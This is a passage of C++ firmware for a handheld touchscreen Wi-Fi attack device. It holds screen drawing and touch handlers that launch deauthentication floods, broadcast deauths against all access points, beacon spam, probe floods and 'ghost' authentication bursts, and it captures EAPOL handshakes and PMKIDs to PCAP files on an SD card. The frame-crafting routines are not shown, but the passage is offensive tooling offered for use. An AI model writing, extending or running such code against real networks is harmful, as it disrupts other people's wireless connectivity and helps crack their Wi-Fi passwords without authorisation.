      if (v) {
        tft.setTextColor(0x07E0, TFT_BLACK);
        tft.drawString("\x18", hsTblX + xOff, ry);  // checkmark approx
      } else {
        tft.setTextColor(0xF800, TFT_BLACK);
        tft.drawString("-", hsTblX + xOff, ry);
      }
    };
    indicator(hsColW * 2, t.m1);
    indicator(hsColW * 3, t.m2);
    indicator(hsColW * 4, t.m3);
    indicator(hsColW * 5, t.m4);
  }
  if (specterHsCount == 0) {
    tft.setTextColor(0x7BEF, TFT_BLACK);
    tft.drawString("No EAPOL captured", hsTblX, hsTblY + 12);
  }

  // ═══════════════════════════════════════════════════════════════
  //  BOTTOM BAR — 4 action buttons
  // ═══════════════════════════════════════════════════════════════
  const int btnCount = 4;
  const int btnGap   = 4;
  const int btnW4    = (bottom.w - btnGap * (btnCount - 1)) / btnCount;

  btnSpEngage    = {bottom.x + 0*(btnW4+btnGap), bottom.y, btnW4, bottom.h,
                    engaged ? "STOP" : "ENGAGE"};
  btnSpGhost     = {bottom.x + 1*(btnW4+btnGap), bottom.y, btnW4, bottom.h, "GHOST NOW"};
  btnSpSetTarget = {bottom.x + 2*(btnW4+btnGap), bottom.y, btnW4, bottom.h, "SET TGT"};
  btnSpBack      = {bottom.x + 3*(btnW4+btnGap), bottom.y, btnW4, bottom.h, "BACK"};

  // ENGAGE/STOP: green when idle, red when active
  drawButton(btnSpEngage,    engaged ? TFT_MAROON    : 0x0340,  // dark red / dark green bg
             engaged         ? 0xF800              : 0x07E0,  // red / green border
             TFT_WHITE);
  drawButton(btnSpGhost,     0x000F,  0xF81F, TFT_WHITE);  // navy/magenta
  drawButton(btnSpSetTarget, 0x0010,  0x07FF, TFT_WHITE);  // dark navy/cyan
  drawButton(btnSpBack,      0x180E,  0x07FF, TFT_WHITE);  // midnight/cyan

  // (btnSpPktLab not shown in new layout — handled by BACK→Packet Lab from home)
  btnSpPktLab = {0, 0, 0, 0, ""};  // zero out to prevent ghost hits

  // ── Render signature ─────────────────────────────────────────
  uint32_t sig = 2166136261u;
  auto mix = [&](uint32_t v) { sig ^= v; sig *= 16777619u; };
  mix((uint32_t)specterPmkidCount);
  mix((uint32_t)specterHsCount);
  mix((uint32_t)specterClientCount);
  mix((uint32_t)(specterGhostCount & 0xFF));
  mix((uint32_t)specterLogHead);
  mix((uint32_t)autoMode);
  mix((uint32_t)hasTarget);
  mix((uint32_t)specterGhostInFlight);
  specterScreenLastSig = sig;

  drawBorder();
}

static void specterScreenTick_UI(int tx, int ty) {
  if (screen != ScreenId::SP3CTER_SCREEN) return;

  if (hit(btnSpBack, tx, ty)) {
    if (autoMode == AutoMode::SP3CTER) disengageAutoMode();
    setScreen(ScreenId::HOME);
    waitTouchRelease(); return;
  }
  if (hit(btnSpEngage, tx, ty)) {
    if (autoMode == AutoMode::SP3CTER) disengageAutoMode();
    else if (hasTarget)                engageAutoMode(AutoMode::SP3CTER);
    drawSpecter(); waitTouchRelease(); return;
  }
  if (hit(btnSpGhost, tx, ty)) {
    // Fire one ghost sequence immediately regardless of engage state
    specterRandomizeSta();
    specterSendGhostAuth();
    specterGhostCount++;
    specterGhostSentMs   = millis();
    specterGhostInFlight = true;
    specterAssocSent     = false;
    drawSpecter(); waitTouchRelease(); return;
  }
  if (hit(btnSpSetTarget, tx, ty)) {
    setScreen(ScreenId::WIFI_SCAN);
    waitTouchRelease(); return;
  }
  if (hit(btnSpPktLab, tx, ty)) {
    setScreen(ScreenId::PACKETLAB_MENU);
    waitTouchRelease(); return;
  }
  waitTouchRelease();
}

// ============================================================
//  PACKETLAB Monitor: capture helpers
// ============================================================

// Called from PACKETLABAttackTick via the TX callback — only enqueues the
// frame into a RAM ring buffer; no SD I/O here.
static void PACKETLABPcapFrameCb(const uint8_t* frame, size_t len, uint8_t channel) {
  uint8_t nextHead = (PACKETLABPcapQueueHead + 1) % PACKETLAB_PCAP_QUEUE_SIZE;
  if (nextHead == PACKETLABPcapQueueTail) return;  // full, drop frame
  PACKETLABPcapEntry& e = PACKETLABPcapQueue[PACKETLABPcapQueueHead];
  size_t copyLen = len < sizeof(e.frame) ? len : sizeof(e.frame);
  memcpy(e.frame, frame, copyLen);
  e.len     = (uint8_t)copyLen;
  e.channel = channel;
  e.ts_ms   = millis();
  PACKETLABPcapQueueHead = nextHead;
}

static void PACKETLABOpenCaptures() {
  if (!sdReady) {
    PACKETLABPcapPath[0] = '\0';
    PACKETLABSessionLogPath[0] = '\0';
    PACKETLABPcapFrameCount = 0;
    PACKETLABPcapQueueHead = PACKETLABPcapQueueTail = 0;
    PACKETLABCaptureWasClosed = false;
    PACKETLABSetFrameCallback(nullptr);
    monitorPushLine(TFT_YELLOW, "SD not ready – no PCAP/log");
    Serial.println("[PACKETLAB] SD not ready, capture disabled");
    return;
  }

  // Build timestamped session dir under /PACKETLAB/
  uint32_t ts = millis();
  char dir[96];
  snprintf(dir, sizeof(dir), "/PACKETLAB/%lu", (unsigned long)ts);
  SD.mkdir("/PACKETLAB");
  SD.mkdir(dir);

  snprintf(PACKETLABPcapPath,       sizeof(PACKETLABPcapPath),       "%s/frames.pcap",   dir);
  snprintf(PACKETLABSessionLogPath, sizeof(PACKETLABSessionLogPath), "%s/session.log",   dir);

  // Open PCAP and write global header
  PACKETLABPcapFile = SD.open(PACKETLABPcapPath, FILE_WRITE);
  if (PACKETLABPcapFile) {
    PcapGlobalHeader gh;
    PACKETLABPcapFile.write((const uint8_t*)&gh, sizeof(gh));
    PACKETLABPcapFile.flush();
  } else {
    PACKETLABPcapPath[0] = '\0';
    Serial.printf("[PACKETLAB] Failed to create %s\n", PACKETLABPcapPath);
  }

  // Open session log
  PACKETLABSessionLogFile = SD.open(PACKETLABSessionLogPath, FILE_WRITE);
  if (PACKETLABSessionLogFile) {
    PACKETLABSessionLogFile.printf("=== PACKETLAB SESSION LOG ===\n");
    PACKETLABSessionLogFile.printf("Attack   : %s\n", PACKETLABGetAttackName());
    PACKETLABSessionLogFile.printf("StartMs  : %lu\n", (unsigned long)ts);
    PACKETLABSessionLogFile.flush();
  } else {
    PACKETLABSessionLogPath[0] = '\0';
    Serial.printf("[PACKETLAB] Failed to create %s\n", PACKETLABSessionLogPath);
  }

  PACKETLABPcapFrameCount  = 0;
  PACKETLABCaptureWasClosed = false;
  PACKETLABPcapQueueHead = PACKETLABPcapQueueTail = 0;
  PACKETLABSetFrameCallback(PACKETLABPcapFrameCb);

  Serial.printf("[PACKETLAB] Capture open: %s\n", dir);
  uiMemLog("after_start_capture");
}

// Drain the RAM ring buffer to the PCAP file (call from the monitor tick).
static void PACKETLABDrainPcapQueue() {
  while (PACKETLABPcapQueueTail != PACKETLABPcapQueueHead) {
    PACKETLABPcapEntry& e = PACKETLABPcapQueue[PACKETLABPcapQueueTail];
    if (PACKETLABPcapFile) {
      uint32_t ts_sec  = e.ts_ms / 1000;
      uint32_t ts_usec = (e.ts_ms % 1000) * 1000;
      PcapPacketHeader ph;
      ph.ts_sec   = ts_sec;
      ph.ts_usec  = ts_usec;
      ph.incl_len = e.len;
      ph.orig_len = e.len;
      PACKETLABPcapFile.write((const uint8_t*)&ph, sizeof(ph));
      PACKETLABPcapFile.write(e.frame, e.len);
      PACKETLABPcapFrameCount++;
    }
    PACKETLABPcapQueueTail = (PACKETLABPcapQueueTail + 1) % PACKETLAB_PCAP_QUEUE_SIZE;
  }
  if (PACKETLABPcapFile) PACKETLABPcapFile.flush();
}

static void PACKETLABCloseCaptures() {
  if (PACKETLABCaptureWasClosed) return;
  PACKETLABCaptureWasClosed = true;
  PACKETLABSetFrameCallback(nullptr);
  PACKETLABDrainPcapQueue();

  PACKETLABStats stats = PACKETLABGetStats();
  if (PACKETLABSessionLogFile) {
    PACKETLABSessionLogFile.printf("---\nFramesSent : %lu\n", (unsigned long)stats.framesSent);
    PACKETLABSessionLogFile.printf("ElapsedMs  : %lu\n",   (unsigned long)stats.elapsedMs);
    PACKETLABSessionLogFile.printf("FPS        : %.1f\n",  stats.framesPerSecond);
    PACKETLABSessionLogFile.printf("PcapFrames : %lu\n",   (unsigned long)PACKETLABPcapFrameCount);
    PACKETLABSessionLogFile.printf("LastError  : %s\n",    PACKETLABGetLastError());
    PACKETLABSessionLogFile.printf("=== END ===\n");
    PACKETLABSessionLogFile.close();
  }
  if (PACKETLABPcapFile) PACKETLABPcapFile.close();

  Serial.printf("[PACKETLAB] Capture closed – %lu frames, %lu pcap frames\n",
                (unsigned long)stats.framesSent, (unsigned long)PACKETLABPcapFrameCount);
  uiMemLog("after_stop_capture");
}

// ============================================================
//  PACKETLAB Monitor screen draw — split into initial and incremental
// ============================================================

// Forward declaration
static void drawPACKETLABMonitorTerminal();

// Full screen initialization (called once on setScreen)
static void drawPACKETLABMonitorFull() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PACKETLAB MONITOR");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();

  // --- Buttons ---
  int btnY = h - 44 + 4;
  int btnH2 = 44 - 8;
  int stopW = (w - 24) * 2 / 3;
  int fileW = (w - 24) - stopW;

  btnPACKETLABMonBack  = {8,          btnY, stopW, btnH2, PACKETLABIsAttacking() ? "STOP" : "BACK"};
  btnPACKETLABMonFiles = {8 + stopW + 8, btnY, fileW, btnH2, "FILES"};

  drawButton(btnPACKETLABMonBack,  TFT_BLACK, PACKETLABIsAttacking() ? TFT_RED   : 0x0380, TFT_WHITE);
  drawButton(btnPACKETLABMonFiles, TFT_BLACK, TFT_NAVY, TFT_WHITE);

  drawBorder();
  
  // Initial status + log draw
  drawPACKETLABMonitorTerminal();
}

// Incremental terminal window update (just the log area + status strip)
static void drawPACKETLABMonitorTerminal() {
  const int w = tft.width();
  const int h = tft.height();

  bool attacking = PACKETLABIsAttacking();
  PACKETLABStats stats = PACKETLABGetStats();

  // --- Attack status strip (below header, 40-64) ---
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.fillRect(0, 40, w, 24, TFT_BLACK);

  if (attacking) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("ACTIVE >", 6, 40);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(PACKETLABGetAttackName(), 68, 40);
  } else {
    tft.setTextColor(0x7BCF, TFT_BLACK);
    tft.drawString("STOPPED", 6, 40);
  }

  if (attacking) {
    char buf[64];
    snprintf(buf, sizeof(buf), "F:%-6lu FPS:%.0f  T:%lus",
             (unsigned long)stats.framesSent,
             stats.framesPerSecond,
             (unsigned long)(stats.elapsedMs / 1000));
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString(buf, 6, 52);
  }

  // --- Scrolling log box (terminal window) ---
  const int boxY = 66;
  const int btnAreaH = 44;
  const int boxH = h - boxY - btnAreaH;
  const int lineH = 14;
  int visLines = boxH / lineH;
  if (visLines > MONITOR_MAX_LINES) visLines = MONITOR_MAX_LINES;

  // Draw terminal box border
  tft.drawRect(0, boxY, w, boxH, 0x2945);

  // Fill terminal background
  tft.fillRect(1, boxY + 1, w - 2, boxH - 2, TFT_BLACK);

  // Draw log lines
  int startIdx = 0;
  if (monitorLineCount > visLines) startIdx = monitorLineCount - visLines;
  for (int i = 0; i < visLines; i++) {
    int idx = startIdx + i;
    if (idx >= monitorLineCount) break;
    int row = idx % MONITOR_MAX_LINES;
    tft.setTextColor(monitorLines[row].color, TFT_BLACK);
    tft.drawString(monitorLines[row].text, 4, boxY + 2 + i * lineH);
  }

  // Spinner (only while attacking)
  if (attacking) {
    static uint8_t sp = 0;
    static uint32_t spinLastMs = 0;
    uint32_t now = millis();
    if (now - spinLastMs > 100) {
      spinLastMs = now;
      sp = (sp + 1) & 3;
    }
    const char* spinFrames[] = {"|", "/", "-", "\\"};
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(spinFrames[sp], w - 16, boxY + boxH - 14);
  }
}

static void drawPACKETLABMonitor() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("PACKETLAB MONITOR");
  drawUniversalBackground();

  const int w = tft.width();
  const int h = tft.height();

  bool attacking = PACKETLABIsAttacking();
  PACKETLABStats stats = PACKETLABGetStats();

  // --- Attack status strip (below header) ---
  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.fillRect(0, 40, w, 24, TFT_BLACK);

  if (attacking) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("ACTIVE >", 6, 40);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString(PACKETLABGetAttackName(), 68, 40);
  } else {
    tft.setTextColor(0x7BCF, TFT_BLACK);
    tft.drawString("STOPPED", 6, 40);
  }

  if (attacking) {
    char buf[64];
    snprintf(buf, sizeof(buf), "F:%-6lu FPS:%.0f  T:%lus",
             (unsigned long)stats.framesSent,
             stats.framesPerSecond,
             (unsigned long)(stats.elapsedMs / 1000));
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.drawString(buf, 6, 52);
  }

  // --- Scrolling log box ---
  const int boxY = 66;
  const int btnAreaH = 44;
  const int boxH = h - boxY - btnAreaH;
  const int lineH = 14;
  int visLines = boxH / lineH;
  if (visLines > MONITOR_MAX_LINES) visLines = MONITOR_MAX_LINES;

  tft.drawRect(0, boxY, w, boxH, 0x2945);

  int startIdx = 0;
  if (monitorLineCount > visLines) startIdx = monitorLineCount - visLines;
  for (int i = 0; i < visLines; i++) {
    int idx = startIdx + i;
    if (idx >= monitorLineCount) break;
    int row = idx % MONITOR_MAX_LINES;
    tft.setTextColor(monitorLines[row].color, TFT_BLACK);
    tft.drawString(monitorLines[row].text, 4, boxY + 2 + i * lineH);

  }

  // Spinner (only while attacking)
  if (attacking) {
    static uint8_t sp = 0;
    const char* spinFrames[] = {"|", "/", "-", "\\"};
    sp = (sp + 1) & 3;
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString(spinFrames[sp], w - 16, boxY + boxH - 14);
  }

  // --- Buttons ---
  int btnY = h - btnAreaH + 4;
  int btnH2 = btnAreaH - 8;
  int stopW = (w - 24) * 2 / 3;
  int fileW = (w - 24) - stopW;

  btnPACKETLABMonBack  = {8,          btnY, stopW, btnH2, attacking ? "STOP" : "BACK"};
  btnPACKETLABMonFiles = {8 + stopW + 8, btnY, fileW, btnH2, "FILES"};

  drawButton(btnPACKETLABMonBack,  TFT_BLACK, attacking ? TFT_RED   : 0x0380, TFT_WHITE);
  drawButton(btnPACKETLABMonFiles, TFT_BLACK, TFT_NAVY, TFT_WHITE);

  drawBorder();
}

// ============================================================
//  PACKETLAB Monitor tick (runs every 500 ms from loop())
// ============================================================
static void PACKETLABMonitorTick() {
  if (screen != ScreenId::PACKETLAB_MONITOR) return;
  uint32_t now = millis();
  
  // Drain PCAP queue every 50ms to prevent overflow
  if (now - PACKETLABMonLastUpdateMs >= 50) {
    PACKETLABMonLastUpdateMs = now;
    PACKETLABDrainPcapQueue();
  }

  bool attacking = PACKETLABIsAttacking();
  
  // Update content only when needed (attacking, or state changed, or new lines added)
  bool shouldUpdate = false;
  
  // Check if attack state changed (attacking -> stopped or vice versa)
  if (attacking != PACKETLABMonLastAttackingState) {
    PACKETLABMonLastAttackingState = attacking;
    shouldUpdate = true;
  }
  
  // Check if new content added to terminal
  if (monitorLineCount != PACKETLABMonLastLineCount) {
    PACKETLABMonLastLineCount = monitorLineCount;
    shouldUpdate = true;
  }
  
  // If attacking, add periodic stats (every 500ms max)
  static uint32_t lastStatsMs = 0;
  if (attacking && now - lastStatsMs >= 500) {
    lastStatsMs = now;
    PACKETLABStats stats = PACKETLABGetStats();
    PACKETLABAttackType attackType = PACKETLABGetCurrentAttackType();
    
    // Build contextual description based on attack type
    const char* description = "";
    switch (attackType) {
      case PACKETLABAttackType::DEAUTH_FLOOD:
        description = "Deauth Flood";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)PACKETLABPcapFrameCount);
        break;
      case PACKETLABAttackType::BEACON_SPAM:
        description = "Beacon Spam";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)PACKETLABPcapFrameCount);
        break;
      case PACKETLABAttackType::PROBE_FLOOD:
        description = "Probe Flood";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)PACKETLABPcapFrameCount);
        break;
      case PACKETLABAttackType::DEAUTH_BROADCAST:
        description = "Broadcast Deauth";
        monitorPushLine(TFT_CYAN,
                        "%s: %lu frames, %.0f fps, PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)PACKETLABPcapFrameCount);
        break;
      default:
        description = PACKETLABGetAttackName();
        monitorPushLine(TFT_CYAN,
                        "%s: F:%lu fps:%.0f PCAP:%lu",
                        description,
                        (unsigned long)stats.framesSent,
                        stats.framesPerSecond,
                        (unsigned long)PACKETLABPcapFrameCount);
    }
    
    Serial.printf("[PACKETLAB] %s | F:%lu FPS:%.1f PCAP:%lu T:%lus\n",
                  description,
                  (unsigned long)stats.framesSent,
                  stats.framesPerSecond,
                  (unsigned long)PACKETLABPcapFrameCount,
                  (unsigned long)(stats.elapsedMs / 1000));
    
    shouldUpdate = true;
  }

  // Handle attack completion
  if (!attacking && !PACKETLABCaptureWasClosed) {
    PACKETLABStats stats = PACKETLABGetStats();
    PACKETLABAttackType attackType = PACKETLABGetCurrentAttackType();
    PACKETLABCloseCaptures();
    
    monitorPushLine(TFT_GREEN, "== ATTACK COMPLETE ==");
    monitorPushLine(TFT_WHITE, "Type: %s", PACKETLABGetAttackName());
    monitorPushLine(TFT_WHITE, "Frames: %lu | Time: %lu s", 
                    (unsigned long)stats.framesSent,
                    (unsigned long)(stats.elapsedMs / 1000));
    
    // Show captures
    if (PACKETLABPcapFrameCount > 0)
      monitorPushLine(TFT_CYAN, "PCAP: %lu frames captured", (unsigned long)PACKETLABPcapFrameCount);
    if (PACKETLABPcapPath[0])
      monitorPushLine(TFT_CYAN, "File: %s", PACKETLABPcapPath);
    if (PACKETLABSessionLogPath[0])
      monitorPushLine(TFT_CYAN, "Log : %s", PACKETLABSessionLogPath);
    
    Serial.printf("[PACKETLAB] %s complete. F=%lu T=%lus PCAP=%lu\n",
                  PACKETLABGetAttackName(),
                  (unsigned long)stats.framesSent,
                  (unsigned long)(stats.elapsedMs / 1000),
                  (unsigned long)PACKETLABPcapFrameCount);
    shouldUpdate = true;
  }

  // Redraw only if something actually changed
  if (shouldUpdate) {
    drawPACKETLABMonitorTerminal();
  }
}

// Forward declare setScreen because it is defined further down in this file.
static void setScreen(ScreenId next);

// Tick handler for PACKETLAB Set Target screen
static void PACKETLABSetTargetTick_UI(int tx, int ty) {
  if (screen != ScreenId::PACKETLAB_SET_TARGET) return;

  const int visibleNetworks = max(1, PACKETLABTargetListItemsPerScreen - 1);
  int maxScroll = apCount - visibleNetworks;
  if (maxScroll < 0) maxScroll = 0;
  PACKETLABTargetScroll = clampi(PACKETLABTargetScroll, 0, maxScroll);

  if (hit(btnPACKETLABSetTargetUp, tx, ty)) {
    if (PACKETLABTargetScroll > 0) {
      PACKETLABTargetScroll--;
      drawPACKETLABSetTarget();
    }
    waitTouchRelease();
    return;
  }

  if (hit(btnPACKETLABSetTargetDown, tx, ty)) {
    if (PACKETLABTargetScroll < maxScroll) {
      PACKETLABTargetScroll++;
      drawPACKETLABSetTarget();
    }
    waitTouchRelease();
    return;
  }

  // Check "Attack All" option
  if (hit(btnPACKETLABSetTargetAll, tx, ty)) {
    Serial.println("[PACKETLAB] Attack All APs selected");
    PACKETLABTargetSsid[0] = '\0';  // Mark as all APs
    apSelected = -1;
    PACKETLABHasSelectedTarget = true;
    setScreen(ScreenId::PACKETLAB_MENU);
    waitTouchRelease();
    return;
  }

  // Check network rows
  for (int row = 0; row < visibleNetworks; row++) {
    const int i = PACKETLABTargetScroll + row;
    if (i < 0 || i >= apCount) continue;
    if (!hit(btnPACKETLABSetTargetRows[row], tx, ty)) continue;

    // Selected this network
    apSelected = i;
    PACKETLABTargetChannel = aps[i].channel;
    strncpy(PACKETLABTargetSsid, aps[i].ssid.c_str(), 19);
    PACKETLABTargetSsid[19] = '\0';
    // Convert BSSID string to bytes
    String bssidStr = aps[i].bssid;
    if (macFromString(bssidStr.c_str(), PACKETLABTargetBssid)) {
      PACKETLABHasSelectedTarget = true;
      Serial.printf("[PACKETLAB] Selected target: %s [CH%d]\n",
                    PACKETLABTargetSsid, PACKETLABTargetChannel);
    }
    setScreen(ScreenId::PACKETLAB_MENU);
    waitTouchRelease();
    return;
  }

  // Legacy rectangular hit fallback for full row area.
  if (tx >= PACKETLABTargetListX && tx < (PACKETLABTargetListX + PACKETLABTargetListW) &&
      ty >= PACKETLABTargetListTopY + PACKETLABTargetListItemH) {
    int row = (ty - (PACKETLABTargetListTopY + PACKETLABTargetListItemH)) / PACKETLABTargetListItemH;
    const int i = PACKETLABTargetScroll + row;
    if (row >= 0 && row < visibleNetworks && i >= 0 && i < apCount) {
      apSelected = i;
      PACKETLABTargetChannel = aps[i].channel;
      strncpy(PACKETLABTargetSsid, aps[i].ssid.c_str(), 19);
      PACKETLABTargetSsid[19] = '\0';
      // Convert BSSID string to bytes
      String bssidStr = aps[i].bssid;
      if (macFromString(bssidStr.c_str(), PACKETLABTargetBssid)) {
        PACKETLABHasSelectedTarget = true;
        Serial.printf("[PACKETLAB] Selected target: %s [CH%d]\n",
                      PACKETLABTargetSsid, PACKETLABTargetChannel);
      }
      setScreen(ScreenId::PACKETLAB_MENU);
      waitTouchRelease();
      return;
    }
  }

  // Check Back button
  if (hit(btnPACKETLABSetTargetBack, tx, ty)) {
    Serial.println("[PACKETLAB] Back from Set Target");
    setScreen(ScreenId::PACKETLAB_MENU);
    waitTouchRelease();
    return;
  }

  waitTouchRelease();
}

static void PACKETLABMenuTick_UI(int tx, int ty) {
  if (screen != ScreenId::PACKETLAB_MENU) return;

  if (PACKETLABIsAttacking()) {
    // Only allow STOP button when attacking
    if (hit(PACKETLABMenuBtns[9], tx, ty)) {
      Serial.println("[PACKETLAB] STOP ATTACK pressed");
      PACKETLABStopAttack();
      drawPACKETLABMenu();
      waitTouchRelease();
      return;
    }
    waitTouchRelease();
    return;
  }

  // Check PUSH!T button — no PACKETLAB target needed
  if (hit(PACKETLABMenuBtns[4], tx, ty)) {
    Serial.println("[ui] Packet Lab -> PUSH1T");
    setScreen(ScreenId::PUSH1T_SCREEN);
    waitTouchRelease();
    return;
  }

  // Check SP3CTER button — no PACKETLAB target needed
  if (hit(PACKETLABMenuBtns[5], tx, ty)) {
    Serial.println("[ui] Packet Lab -> SP3CTER");
    setScreen(ScreenId::SP3CTER_SCREEN);
    waitTouchRelease();
    return;
  }

  // Check Set Target button
  if (hit(PACKETLABMenuBtns[8], tx, ty)) {
    Serial.println("[PACKETLAB] Set Target pressed");
    setScreen(ScreenId::PACKETLAB_SET_TARGET);
    waitTouchRelease();
    return;
  }

  // Check Back button
  if (hit(PACKETLABMenuBtns[9], tx, ty)) {
    Serial.println("[PACKETLAB] Back to Home");
    setScreen(ScreenId::HOME);
    waitTouchRelease();
    return;
  }

  // Check if we have a target before allowing attacks
  if (!PACKETLABHasSelectedTarget) {
    tft.fillScreen(TFT_BLACK);
    drawHeader("Error");
    const bool compact = (tft.height() <= 180);
    tft.setTextDatum(TL_DATUM);
    applyFontSm();
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("No target selected!", 10, compact ? 72 : 100);
    tft.drawString("Press 'Set Target' first", 10, compact ? 88 : 120);
    delay(2000);
    drawPACKETLABMenu();
    waitTouchRelease();
    return;
  }

  // Attack button handlers
  // DEAUTH FLOOD
  if (hit(PACKETLABMenuBtns[0], tx, ty)) {
    Serial.println("[PACKETLAB] Deauth Flood pressed");
    if (PACKETLABTargetSsid[0] == '\0') {
      // Attack all - use a default channel
      uint8_t ch = 6;
      PACKETLABStartDeauthBroadcast(ch, 30000);
    } else {
      PACKETLABTarget bt;
      memcpy(bt.bssid, PACKETLABTargetBssid, 6);
      strncpy(bt.ssid, PACKETLABTargetSsid, 23);
      bt.channel = PACKETLABTargetChannel;
      PACKETLABStartDeauthFlood(bt, 30000);
    }
    setScreen(ScreenId::PACKETLAB_MONITOR);
    waitTouchRelease();
    return;
  }

  // BEACON SPAM
  if (hit(PACKETLABMenuBtns[1], tx, ty)) {
    Serial.println("[PACKETLAB] Beacon Spam pressed");
    if (PACKETLABTargetSsid[0] == '\0') {
      PACKETLABStartBeaconSpam("freeWifi", 6, 20000, nullptr);
    } else {
      PACKETLABTarget bt;
      memcpy(bt.bssid, PACKETLABTargetBssid, 6);
      strncpy(bt.ssid, PACKETLABTargetSsid, 23);
      bt.channel = PACKETLABTargetChannel;
      PACKETLABStartBeaconSpam(bt.ssid, bt.channel, 20000, &bt);
    }
    setScreen(ScreenId::PACKETLAB_MONITOR);
    waitTouchRelease();
    return;
  }

  // PROBE FLOOD
  if (hit(PACKETLABMenuBtns[2], tx, ty)) {
    Serial.println("[PACKETLAB] Probe Flood pressed");
    const char* ssid = (PACKETLABTargetSsid[0] != '\0') ? PACKETLABTargetSsid : "unknown";
    uint8_t ch = (PACKETLABTargetSsid[0] != '\0') ? PACKETLABTargetChannel : 6;
    PACKETLABStartProbeFlood(ssid, ch, 20000);
    setScreen(ScreenId::PACKETLAB_MONITOR);
    waitTouchRelease();
    return;
  }

  // DEAUTH ALL (broadcast to all devices)
  if (hit(PACKETLABMenuBtns[3], tx, ty)) {
    Serial.println("[PACKETLAB] Deauth All pressed");
    uint8_t ch = (PACKETLABTargetSsid[0] != '\0') ? PACKETLABTargetChannel : 6;
    PACKETLABStartDeauthBroadcast(ch, 25000);
    setScreen(ScreenId::PACKETLAB_MONITOR);
    waitTouchRelease();
    return;
  }

  // Y0INK
  if (hit(PACKETLABMenuBtns[6], tx, ty)) {
    Serial.println("[ui] Packet Lab -> Y0INK");
    engageAutoMode(AutoMode::Y0INK);
    setScreen(ScreenId::TARGET_DETAILS);
    waitTouchRelease();
    return;
  }

  // JAMM!T
  if (hit(PACKETLABMenuBtns[7], tx, ty)) {
    Serial.println("[ui] Packet Lab -> JAMMIT");
    engageAutoMode(AutoMode::JAMMIT);
    setScreen(ScreenId::TARGET_DETAILS);
    waitTouchRelease();
    return;
  }

  waitTouchRelease();
}

static const char* neonPanicModeLabel(NeonPanicMode mode) {
  switch (mode) {
    case NeonPanicMode::BOOT_TUNNEL: return "MODE 1 // BOOT TUNNEL";
    case NeonPanicMode::BLUEPRINT_REALITY: return "MODE 6 // BLUEPRINT->REALITY";
    case NeonPanicMode::PWN_COUNTER: return "MODE 9 // PWN COUNTER";
    case NeonPanicMode::STEALTH_MINIMAL: return "MODE 10 // STEALTH";
  }
  return "MODE";
}

static void drawNeonSpinner(int cx, int cy, int radius, uint16_t colA, uint16_t colB) {
  const float a = (float)neonPanicFrame * 0.05f;
  const float b = (float)neonPanicFrame * 0.031f;
  const int x1 = cx + (int)(cosf(a) * radius);
  const int y1 = cy + (int)(sinf(a) * radius);
  const int x2 = cx + (int)(cosf(-b) * (radius - 8));
  const int y2 = cy + (int)(sinf(-b) * (radius - 8));
  tft.drawCircle(cx, cy, radius, colA);
  tft.drawCircle(cx, cy, max(6, radius - 8), colB);
  tft.drawLine(cx, cy, x1, y1, colA);
  tft.drawLine(cx, cy, x2, y2, colB);
  tft.fillCircle(x1, y1, 2, colA);
  tft.fillCircle(x2, y2, 2, colB);
}

static void drawModeBootTunnel(int w, int h) {
  const uint16_t bg = 0x0002;
  tft.fillRect(0, 0, w, h, bg);
  const int cx = w / 2;
  const int cy = h / 2;
  const float maxR = sqrtf((float)(cx * cx + cy * cy));

  for (int y = 0; y < h; y += 3) {
    const uint16_t c = (y < (h / 2)) ? 0x0003 : 0x0002;
    tft.drawFastHLine(0, y, w, c);
  }
  for (int x = -h; x < w; x += 26) {
    tft.drawLine(x, h - 1, x + h, 0, 0x0802);
  }

  const int starCount = 88;
  for (int i = 0; i < starCount; i++) {
    const uint32_t base = (uint32_t)(i * 2654435761UL);
    const float a = ((float)(base % 6283U) / 1000.0f);
    const float speed = 0.006f + ((float)((base >> 11) & 0x7FU) / 10000.0f);
    float p = fmodf((float)neonPanicFrame * speed + ((float)((base >> 19) & 0xFFU) / 255.0f), 1.0f);
    if (p < 0.0f) p += 1.0f;
    const float z = 0.10f + (p * 0.90f);
    const float rNow = z * z * maxR;
    const float rPrev = max(0.0f, rNow - (0.9f + z * 10.0f));
    const int x1 = cx + (int)(cosf(a) * rPrev);
    const int y1 = cy + (int)(sinf(a) * rPrev);
    const int x2 = cx + (int)(cosf(a) * rNow);
    const int y2 = cy + (int)(sinf(a) * rNow);
    uint16_t col = 0x5AEB;
    if (z > 0.84f) col = 0xB67F;
    else if (z > 0.66f) col = TFT_CYAN;
    else if ((i & 3) == 0) col = 0x780F;
    tft.drawLine(x1, y1, x2, y2, col);
  }

  drawNeonSpinner(cx, cy, (int)((float)min(w, h) * 0.24f), TFT_CYAN, TFT_MAGENTA);

  tft.setTextDatum(TL_DATUM);
  applyFontSm();
  tft.setTextColor(0xE71F, bg);
  tft.drawString("NEONDRIVE // BOOT TUNNEL", 6, 6);
}

static void drawModeBlueprintReality(int w, int h) {
  const uint16_t bg = 0x0001;
  tft.fillRect(0, 0, w, h, bg);
  for (int y = 0; y < h; y += 14) tft.drawFastHLine(0, y, w, 0x18A3);
